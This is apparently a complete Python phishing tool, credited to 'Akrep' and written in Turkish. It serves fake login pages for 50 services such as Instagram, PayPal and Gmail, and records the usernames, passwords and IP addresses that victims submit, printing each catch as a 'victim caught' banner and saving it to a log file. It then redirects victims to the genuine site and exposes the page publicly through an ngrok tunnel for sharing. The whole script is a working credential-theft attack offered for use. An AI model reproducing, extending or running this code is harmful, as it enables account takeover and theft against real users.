#!/usr/bin/env python3

import os
import sys
import time
import random
import subprocess
import socket
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

os.system('clear' if os.name == 'posix' else 'cls')

# BANNER
YELLOW = '\033[93m'
RED = '\033[91m'
GREEN = '\033[92m'
BLUE = '\033[94m'
RESET = '\033[0m'

print(YELLOW)
print("""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║    ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗                        ║
║    ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗                       ║
║    ██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝                       ║
║    ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗                       ║
║    ██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║                       ║
║    ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝                       ║
║                                                                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║                         🔱 PHISHER TOOL v3.0 ULTIMATE 🔱                      ║
║                                                                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║                         🦂 Developed By Akrep 🦂                             ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
""")
print(RESET)

# 50 SITE - HEPSi
SITES = {
    "1": {"name": "Instagram", "url": "https://www.instagram.com"},
    "2": {"name": "Facebook", "url": "https://www.facebook.com"},
    "3": {"name": "Twitter", "url": "https://www.twitter.com"},
    "4": {"name": "Snapchat", "url": "https://www.snapchat.com"},
    "5": {"name": "TikTok", "url": "https://www.tiktok.com"},
    "6": {"name": "LinkedIn", "url": "https://www.linkedin.com"},
    "7": {"name": "Reddit", "url": "https://www.reddit.com"},
    "8": {"name": "Pinterest", "url": "https://www.pinterest.com"},
    "9": {"name": "Twitch", "url": "https://www.twitch.tv"},
    "10": {"name": "Discord", "url": "https://www.discord.com"},
    "11": {"name": "Spotify", "url": "https://www.spotify.com"},
    "12": {"name": "Netflix", "url": "https://www.netflix.com"},
    "13": {"name": "Amazon", "url": "https://www.amazon.com"},
    "14": {"name": "Google", "url": "https://www.google.com"},
    "15": {"name": "Microsoft", "url": "https://www.microsoft.com"},
    "16": {"name": "Apple", "url": "https://www.apple.com"},
    "17": {"name": "Yahoo", "url": "https://www.yahoo.com"},
    "18": {"name": "PayPal", "url": "https://www.paypal.com"},
    "19": {"name": "GitHub", "url": "https://www.github.com"},
    "20": {"name": "Steam", "url": "https://www.steampowered.com"},
    "21": {"name": "WhatsApp", "url": "https://web.whatsapp.com"},
    "22": {"name": "Telegram", "url": "https://web.telegram.org"},
    "23": {"name": "Tumblr", "url": "https://www.tumblr.com"},
    "24": {"name": "Flickr", "url": "https://www.flickr.com"},
    "25": {"name": "Quora", "url": "https://www.quora.com"},
    "26": {"name": "Medium", "url": "https://www.medium.com"},
    "27": {"name": "Imgur", "url": "https://www.imgur.com"},
    "28": {"name": "DeviantArt", "url": "https://www.deviantart.com"},
    "29": {"name": "SoundCloud", "url": "https://www.soundcloud.com"},
    "30": {"name": "Vimeo", "url": "https://www.vimeo.com"},
    "31": {"name": "OkCupid", "url": "https://www.okcupid.com"},
    "32": {"name": "Tinder", "url": "https://www.tinder.com"},
    "33": {"name": "Bumble", "url": "https://www.bumble.com"},
    "34": {"name": "OnlyFans", "url": "https://www.onlyfans.com"},
    "35": {"name": "Patreon", "url": "https://www.patreon.com"},
    "36": {"name": "Twitch", "url": "https://www.twitch.tv"},
    "37": {"name": "YouTube", "url": "https://www.youtube.com"},
    "38": {"name": "Gmail", "url": "https://mail.google.com"},
    "39": {"name": "Outlook", "url": "https://outlook.live.com"},
    "40": {"name": "ProtonMail", "url": "https://mail.proton.me"},
    "41": {"name": "WordPress", "url": "https://wordpress.com"},
    "42": {"name": "Blogger", "url": "https://www.blogger.com"},
    "43": {"name": "Wix", "url": "https://www.wix.com"},
    "44": {"name": "Weebly", "url": "https://www.weebly.com"},
    "45": {"name": "Etsy", "url": "https://www.etsy.com"},
    "46": {"name": "eBay", "url": "https://www.ebay.com"},
    "47": {"name": "AliExpress", "url": "https://www.aliexpress.com"},
    "48": {"name": "Walmart", "url": "https://www.walmart.com"},
    "49": {"name": "Target", "url": "https://www.target.com"},
    "50": {"name": "BestBuy", "url": "https://www.bestbuy.com"},
}

def login_page(site_name):
    return f'''<!DOCTYPE html>
<html>
<head><title>{site_name} - Güvenli Giriş</title>
<style>
* {{margin:0;padding:0;box-sizing:border-box;}}
body {{
background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);
font-family:Arial;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
}}
.box {{
background:white;
padding:45px;
border-radius:12px;
box-shadow:0 10px 40px rgba(0,0,0,0.2);
width:380px;
text-align:center;
}}
.box h2 {{
color:#333;
margin-bottom:25px;
font-size:28px;
}}
.box input {{
width:100%;
padding:12px;
margin:12px 0;
border:1px solid #ddd;
border-radius:6px;
font-size:14px;
}}
.box input:focus {{
outline:none;
border-color:#667eea;
}}
.box button {{
width:100%;
padding:12px;
background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);
color:white;
border:none;
border-radius:6px;
font-size:16px;
cursor:pointer;
font-weight:bold;
}}
.box button:hover {{
transform:scale(1.02);
}}
.footer {{
margin-top:20px;
font-size:12px;
color:#888;
}}
</style>
</head>
<body>
<div class="box">
<h2>{site_name}</h2>
<form method="POST" action="/login">
<input type="text" name="email" placeholder="E-posta veya Kullanıcı Adı" required>
<input type="password" name="password" placeholder="Şifre" required>
<button type="submit">Giriş Yap</button>
</form>
<div class="footer">Güvenli bağlantı ile giriş yapıyorsunuz</div>
</div>
</body>
</html>'''

class Handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(Handler.html.encode())
            ip = self.client_address[0]
            print(f"{GREEN}[+] {datetime.now().strftime('%H:%M:%S')} | IP: {ip} | {Handler.site_name} sayfası açıldı{RESET}")
    
    def do_POST(self):
        if self.path == '/login':
            length = int(self.headers['Content-Length'])
            data = self.rfile.read(length).decode()
            params = {}
            for x in data.split('&'):
                if '=' in x:
                    k,v = x.split('=',1)
                    params[k] = v
            
            ip = self.client_address[0]
            
            print(f"\n{RED}{'█'*60}{RESET}")
            print(f"{RED}███ {YELLOW}🦂 KURBAN YAKALANDI 🦂 {RED}███{RESET}")
            print(f"{RED}{'█'*60}{RESET}")
            print(f"{GREEN}📅 Zaman: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{RESET}")
            print(f"{GREEN}📍 IP: {ip}{RESET}")
            print(f"{GREEN}🎯 Platform: {Handler.site_name}{RESET}")
            print(f"{YELLOW}🔐 BİLGİLER:{RESET}")
            for k,v in params.items():
                print(f"   {BLUE}{k}:{RESET} {v}")
            print(f"{RED}{'█'*60}{RESET}\n")
            
            with open('akrep_logs.txt', 'a') as f:
                f.write(f"[{datetime.now()}] IP:{ip} | Site:{Handler.site_name} | {params}\n")
                f.write("-"*50 + "\n")
            
            self.send_response(302)
            self.send_header('Location', Handler.target_url)
            self.end_headers()

def check_port(p):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    return s.connect_ex(('127.0.0.1', p)) == 0

def menu_page(start, end):
    os.system('clear' if os.name == 'posix' else 'cls')
    print(YELLOW)
    print("""
╔══════════════════════════════════════════════════════════════╗
║                   🦂 AKREP PHISHER 🦂                       ║
║                      50 PLATFORM                             ║
╚══════════════════════════════════════════════════════════════╝
""")
    print(RESET)
    print(f"{GREEN}╔════════════════════════════════════════╗{RESET}")
    print(f"{GREEN}║         SAYFA {start}-{end} / 50                  ║{RESET}")
    print(f"{GREEN}╚════════════════════════════════════════╝{RESET}\n")
    
    for i in range(start, min(end, 51)):
        if str(i) in SITES:
            print(f"{BLUE}[{i:>2}]{RESET} {SITES[str(i)]['name']}")
    
    print(f"\n{RED}[0] Çıkış{RESET}")
    print(f"{YELLOW}[N] Sonraki Sayfa{RESET}")
    print(f"{YELLOW}[P] Önceki Sayfa{RESET}")
    print(f"{YELLOW}[L] Logları Göster{RESET}")

def show_logs():
    if os.path.exists('akrep_logs.txt'):
        print(f"\n{RED}{'='*50}{RESET}")
        print(f"{YELLOW}📁 KAYITLI LOGLAR:{RESET}")
        print(f"{RED}{'='*50}{RESET}")
        with open('akrep_logs.txt', 'r') as f:
            print(f.read())
    else:
        print(f"{RED}[-] Henüz log yok{RESET}")
    input(f"\n{YELLOW}[Enter] ile devam...{RESET}")

def main():
    page = 1
    while True:
        start = (page-1)*10 + 1
        end = page*10
        menu_page(start, end)
        
        secim = input(f"\n{RED}[{YELLOW}?{RED}]{RESET} Seçim: ")
        
        if secim == '0':
            print(f"{RED}🦂 Çıkılıyor...{RESET}")
            sys.exit()
        elif secim.upper() == 'N':
            if page < 5:
                page += 1
            continue
        elif secim.upper() == 'P':
            if page > 1:
                page -= 1
            continue
        elif secim.upper() == 'L':
            show_logs()
            continue
        
        if secim not in SITES:
            print(f"{RED}[!] Hatalı seçim!{RESET}")
            time.sleep(1)
            continue
        
        site = SITES[secim]
        Handler.html = login_page(site['name'])
        Handler.site_name = site['name']
        Handler.target_url = site['url']
        
        print(f"\n{GREEN}[+] Platform: {site['name']}{RESET}")
        
        port = 8080
        if check_port(port):
            port = random.randint(8081, 8888)
        
        server = HTTPServer(('', port), Handler)
        print(f"{GREEN}[+] Localhost: http://localhost:{port}{RESET}")
        
        print(f"\n{YELLOW}[1] Ngrok ile dışarı aç{RESET}")
        print(f"{YELLOW}[2] Sadece localhost{RESET}")
        tunnel = input(f"{RED}[{YELLOW}?{RED}]{RESET} Seçim: ")
        
        if tunnel == '1':
            print(f"{GREEN}[+] Ngrok başlatılıyor...{RESET}")
            try:
                if os.name == 'nt':
                    subprocess.Popen(['ngrok', 'http', str(port)], shell=True)
                else:
                    subprocess.Popen(['ngrok', 'http', str(port)])
                time.sleep(4)
                try:
                    import requests
                    r = requests.get('http://localhost:4040/api/tunnels', timeout=5)
                    url = r.json()['tunnels'][0]['public_url']
                    print(f"{RED}🔗 PAYLAŞILACAK LINK: {url}{RESET}")
                except:
                    print(f"{RED}[!] Link alınamadı, http://localhost:4040 adresine git{RESET}")
            except:
                print(f"{RED}[!] Ngrok kurulu değil! https://ngrok.com/download{RESET}")
        
        print(f"\n{GREEN}[*] Server çalışıyor...{RESET}")
        print(f"{YELLOW}[*] CTRL+C ile durdur{RESET}")
        print(f"{BLUE}{'='*50}{RESET}\n")
        
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            server.shutdown()
            print(f"\n{RED}[!] Server durduruldu{RESET}")

if __name__ == "__main__":
    main()
